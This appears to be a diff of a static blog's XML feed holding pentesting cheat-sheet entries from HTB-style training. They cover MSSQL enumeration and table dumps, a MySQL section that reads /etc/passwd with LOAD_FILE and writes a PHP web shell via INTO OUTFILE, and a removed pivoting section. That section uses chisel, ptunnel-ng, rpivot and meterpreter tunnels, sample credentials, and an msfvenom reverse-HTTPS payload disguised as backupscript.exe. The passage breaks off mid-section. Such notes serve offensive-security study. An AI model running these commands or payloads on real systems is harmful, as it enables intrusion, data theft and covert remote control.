+<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
+<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Service-Enumeration</category>
+        <category>MSSQL</category>
+      </categories>
+      <tags>
+        <tag>Enumeration</tag>
+        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -2020,46 +2020,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Exploitation</title>
-    <url>/2025/11/21/MySQL-Exploitation/</url>
-    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
-<ul>
-<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
-</li>
-<li><p><strong>Settings: of Secure File Privileges</strong></p>
-<ul>
-<li><p><strong>Empty:</strong> No restriction (not secure).</p>
-</li>
-<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
-</li>
-<li><p><strong>NULL:</strong> File operations are disabled.</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Exploitation</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>Exploitation</tag>
-        <tag>MySQL-Read-Files</tag>
-        <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Network Poisoning</title>
     <url>/2026/06/29/Network-Poisoning/</url>
     <content><![CDATA[<h2 id="SMB-LLMNR-NBT-NS-Poisoning"><a href="#SMB-LLMNR-NBT-NS-Poisoning" class="headerlink" title="SMB (LLMNR &#x2F; NBT-NS Poisoning)"></a>SMB (LLMNR &#x2F; NBT-NS Poisoning)</h2><blockquote>
@@ -2173,6 +2133,46 @@
       <tags>
         <tag>klist</tag>
         <tag>ccache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL Exploitation</title>
+    <url>/2025/11/21/MySQL-Exploitation/</url>
+    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
+<ul>
+<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
+</li>
+<li><p><strong>Settings: of Secure File Privileges</strong></p>
+<ul>
+<li><p><strong>Empty:</strong> No restriction (not secure).</p>
+</li>
+<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
+</li>
+<li><p><strong>NULL:</strong> File operations are disabled.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Exploitation</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>Exploitation</tag>
+        <tag>MySQL-Read-Files</tag>
+        <tag>MySQL-Write-Files</tag>
       </tags>
   </entry>
   <entry>
@@ -2418,163 +2418,6 @@
         <tag>SharpUp</tag>
         <tag>sc.exe</tag>
         <tag>Windows-Services</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pivoting And Port Forwarding</title>
-    <url>/2025/11/22/Pivoting-And-Port-Forwarding/</url>
-    <content><![CDATA[<p>n &#x3D; Our Attacker Machine</p>
-<p>n+1 &#x3D; Pivot Machine</p>
-<p>n+2 &#x3D; Internal Machine</p>
-<h1 id="Local-Port-Forwarding"><a href="#Local-Port-Forwarding" class="headerlink" title="Local Port Forwarding"></a>Local Port Forwarding</h1><h2 id="SSH-n"><a href="#SSH-n" class="headerlink" title="SSH (n)"></a>SSH (n)</h2><p>Forward a Single Port</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L local_port:localhost:remote_port username@n+1</span><br></pre></td></tr></table></figure>
-
-<p>Forward Multiple Ports (n)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L local_port:localhost:remote_port -L local_port:localhost:remote_port username@n+1</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="meterpreter-n"><a href="#meterpreter-n" class="headerlink" title="meterpreter (n)"></a>meterpreter (n)</h3><p>➜ Requires an active Meterpreter session</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l Local-proxy-port -p remote-port -r n+2</span><br></pre></td></tr></table></figure>
-
-<p>Example</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:localhost:Local-proxy-port /u:username /p:password</span><br></pre></td></tr></table></figure>
-
-<h3 id="ptunnel-ng"><a href="#ptunnel-ng" class="headerlink" title="ptunnel-ng"></a>ptunnel-ng</h3><h5 id="Server-Side-n-1"><a href="#Server-Side-n-1" class="headerlink" title="Server Side ( n+1 )"></a>Server Side ( n+1 )</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -r &lt;target-ip (n+1 or n+2)&gt; -R &lt;target-port&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Client-Side-n"><a href="#Client-Side-n" class="headerlink" title="Client Side ( n )"></a>Client Side ( n )</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -p &lt;pivot-ip (n+1)&gt; -l &lt;local-proxy-port&gt; -r &lt;target-ip&gt; -R &lt;target-port&gt;</span><br></pre></td></tr></table></figure>
-
-
-<p>➜ If we forward SSH, we can then use it for dynamic port forwarding.</p>
-<h5 id="Example-Port-forward-SSH"><a href="#Example-Port-forward-SSH" class="headerlink" title="Example : Port forward SSH"></a>Example : Port forward SSH</h5><h6 id="Server-Side-n-1-1"><a href="#Server-Side-n-1-1" class="headerlink" title="Server Side ( n+1 )"></a>Server Side ( n+1 )</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -r10.129.202.64 -R22</span><br></pre></td></tr></table></figure>
-
-<h6 id="Client-Side-n-1"><a href="#Client-Side-n-1" class="headerlink" title="Client Side ( n )"></a>Client Side ( n )</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</span><br></pre></td></tr></table></figure>
-
-<h6 id="Connect-to-the-target-port"><a href="#Connect-to-the-target-port" class="headerlink" title="Connect to the target port"></a>Connect to the target port</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p2222 -lubuntu 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<p>Dynamic Port Forwarding over SSH</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -D 9050 -p2222 -lubuntu 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h5 id="Example-Port-forward-RDP"><a href="#Example-Port-forward-RDP" class="headerlink" title="Example : Port forward RDP"></a>Example : Port forward RDP</h5><h6 id="Client-Side-n-2"><a href="#Client-Side-n-2" class="headerlink" title="Client Side ( n )"></a>Client Side ( n )</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./src/ptunnel-ng -p10.129.202.64 -l 2222 -r172.16.5.19 -R3389</span><br></pre></td></tr></table></figure>
-<h6 id="Server-Side-n-1-2"><a href="#Server-Side-n-1-2" class="headerlink" title="Server Side ( n+1 )"></a>Server Side ( n+1 )</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -r172.16.5.19 -R3389</span><br></pre></td></tr></table></figure>
-<h6 id="Connect-RDP"><a href="#Connect-RDP" class="headerlink" title="Connect RDP"></a>Connect RDP</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:localhost:2222 /u:victor /p:<span class="string">&#x27;pass@123&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Netsh-n-1"><a href="#Netsh-n-1" class="headerlink" title="Netsh (n+1)"></a>Netsh (n+1)</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">netsh.exe</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">add</span> <span class="title">v4tov4</span> <span class="title">listenport</span>=<span class="title">Listener</span>-<span class="title">port</span>-<span class="title">on</span>-<span class="title">n</span>+1 <span class="title">listenaddress</span>=<span class="title">n</span>+1 <span class="title">connectport</span>=<span class="title">remote</span>-<span class="title">port</span>-<span class="title">on</span>-<span class="title">n</span>+2 <span class="title">connectaddress</span>=<span class="title">n</span>+2</span></span><br></pre></td></tr></table></figure>
-
-<p>Example</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">add</span> <span class="title">v4tov4</span> <span class="title">listenport</span>=8080 <span class="title">listenaddress</span>=10.129.42.198 <span class="title">connectport</span>=3389 <span class="title">connectaddress</span>=172.16.5.19</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">netsh.exe</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">show</span> <span class="title">v4tov4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Listen</span> <span class="title">on</span> <span class="title">ipv4</span>:             <span class="title">Connect</span> <span class="title">to</span> <span class="title">ipv4</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Address</span>         <span class="title">Port</span>        <span class="title">Address</span>         <span class="title">Port</span></span></span><br><span class="line"><span class="function">--------------- ----------  --------------- ----------</span></span><br><span class="line"><span class="function">10.129.42.198   8080        172.16.5.19     3389</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.129.42.198:8080 /u:victor /p:<span class="string">&#x27;pass@123&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="Dynamic-Port-Forwarding"><a href="#Dynamic-Port-Forwarding" class="headerlink" title="Dynamic Port Forwarding"></a>Dynamic Port Forwarding</h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Using-Proxychains"><a href="#Using-Proxychains" class="headerlink" title="Using Proxychains"></a>Using Proxychains</h3><h4 id="SSH-n-1"><a href="#SSH-n-1" class="headerlink" title="SSH (n)"></a>SSH (n)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -D Local-proxy-port username@n+1</span><br></pre></td></tr></table></figure>
-
-<h4 id="Meterpreter-n"><a href="#Meterpreter-n" class="headerlink" title="Meterpreter (n)"></a>Meterpreter (n)</h4><p><strong>➜ Requires an active Meterpreter session</strong></p>
-<h5 id="Start-the-SOCKS-Proxy"><a href="#Start-the-SOCKS-Proxy" class="headerlink" title="Start the SOCKS Proxy"></a>Start the SOCKS Proxy</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/server/socks_proxy </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> SRVPORT Local-proxy-port </span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> SRVHOST 0.0.0.0 </span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> version 4a </span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br></pre></td></tr></table></figure>
-
-<h5 id="Add-Route-to-internal-network"><a href="#Add-Route-to-internal-network" class="headerlink" title="Add Route to internal_network"></a>Add Route to internal_network</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use post/multi/manage/autoroute </span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; <span class="built_in">set</span> SESSION &lt;<span class="built_in">id</span>&gt; </span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; <span class="built_in">set</span> SUBNET internal_network_@ </span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; run</span><br></pre></td></tr></table></figure>
-
-<pre><code>or 
-</code></pre>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s internal_network_@/mask</span><br></pre></td></tr></table></figure>
-
-<h4 id="Rpivot"><a href="#Rpivot" class="headerlink" title="Rpivot"></a>Rpivot</h4><h5 id="Server-attacker-machine-n"><a href="#Server-attacker-machine-n" class="headerlink" title="Server (attacker machine - n)"></a>Server (attacker machine - n)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2.7 server.py --proxy-port Local-proxy-port --server-port Listener-port --server-ip 0.0.0.0</span><br></pre></td></tr></table></figure>
-
-<h5 id="Client-pivot-machine-n-1"><a href="#Client-pivot-machine-n-1" class="headerlink" title="Client (pivot machine - n+1)"></a>Client (pivot machine - n+1)</h5><p>Transfer rpivot to n+1 machine:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -r rpivot username@n+1:/home/username/</span><br></pre></td></tr></table></figure>
-
-<p>Run client:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2.7 client.py --server-ip n --server-port Listener-port</span><br></pre></td></tr></table></figure>
-
-<p>Then </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains firefox-esr 172.16.5.135:80</span><br></pre></td></tr></table></figure>
-<p>or </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains curl http://172.16.5.135/</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h4><p>Transfer chisel to n+1 machine:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -r chisel username@n+1:/home/username/</span><br></pre></td></tr></table></figure>
-
-<p>Server ( n+1 )</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./chisel server -v -p listener-port --socks5</span><br></pre></td></tr></table></figure>
-
-
-<p>Client ( n )</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./chisel client -v machine-n+1:listener-port socks</span><br></pre></td></tr></table></figure>
-
-<p>➜ We should use <code>socks5 127.0.0.1 1080</code> in &#x2F;etc&#x2F;proxychains.conf.</p>
-<h4 id="Chisel-Reverse-Pivot"><a href="#Chisel-Reverse-Pivot" class="headerlink" title="Chisel Reverse Pivot"></a>Chisel Reverse Pivot</h4><p>Server ( n )</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./chisel server --reverse -v -p listening-port --socks5</span><br></pre></td></tr></table></figure>
-
-<p>Transfer chisel to n+1 machine:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -r chisel username@n+1:/home/username/</span><br></pre></td></tr></table></figure>
-
-<p>Client ( n+1 )</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./chisel client -v machine-n:listening-port R:socks</span><br></pre></td></tr></table></figure>
-
-<p>➜ We should use <code>socks5 127.0.0.1 1080</code> in &#x2F;etc&#x2F;proxychains.conf.</p>
-<h4 id="Configure-Proxychains-n"><a href="#Configure-Proxychains-n" class="headerlink" title="Configure Proxychains (n)"></a>Configure Proxychains (n)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/proxychains.conf  </span><br><span class="line"></span><br><span class="line">socks4 127.0.0.1 Local-proxy-port</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Without-Proxychains"><a href="#Without-Proxychains" class="headerlink" title="Without Proxychains"></a>Without Proxychains</h3><h4 id="sshuttle-n"><a href="#sshuttle-n" class="headerlink" title="sshuttle (n)"></a>sshuttle (n)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sshuttle -r username@n+1 internal_network_@/mask -v</span><br></pre></td></tr></table></figure>
-
-<p>➜ Automatically handles traffic forwarding without needing Proxychains. </p>
-<p>➜ Works <em>only</em> for SSH-based pivoting (no TOR&#x2F;HTTPS proxy support).</p>
-<p>Example</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:172.16.5.19 /u:victor /p:<span class="string">&#x27;pass@123&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h4 id="plink-exe-n"><a href="#plink-exe-n" class="headerlink" title="plink.exe (n)"></a>plink.exe (n)</h4><h5 id="SSH-Dynamic-SOCKS-Proxy"><a href="#SSH-Dynamic-SOCKS-Proxy" class="headerlink" title="SSH Dynamic SOCKS Proxy"></a>SSH Dynamic SOCKS Proxy</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">plink -ssh -D Local-proxy-port username@n+<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Proxy-Handling-Windows"><a href="#Proxy-Handling-Windows" class="headerlink" title="Proxy Handling (Windows)"></a>Proxy Handling (Windows)</h5><p>Use <strong>Proxifier</strong> to route selected tools through the proxy:</p>
-<p><img src="/img/proxifier.png" alt="Proxifier"></p>
-<p>➜ After configuration, any selected tool will have its traffic forwarded automatically.</p>
-<h1 id="Reverse-Port-Forwarding-Reverse-Bind-Shell"><a href="#Reverse-Port-Forwarding-Reverse-Bind-Shell" class="headerlink" title="Reverse Port Forwarding ( Reverse &#x2F; Bind Shell )"></a>Reverse Port Forwarding ( Reverse &#x2F; Bind Shell )</h1><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><h3 id="Reverse-Shell-Preparation-Payload-Listener-Setup"><a href="#Reverse-Shell-Preparation-Payload-Listener-Setup" class="headerlink" title="Reverse Shell Preparation (Payload + Listener Setup)"></a>Reverse Shell Preparation (Payload + Listener Setup)</h3><p>Create Reverse Shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https lhost=&lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=&lt;Internal-listener-Port-on-n+1&gt;</span><br></pre></td></tr></table></figure>
-
-
-<p> Configuring &amp; Starting multi&#x2F;handler</p>
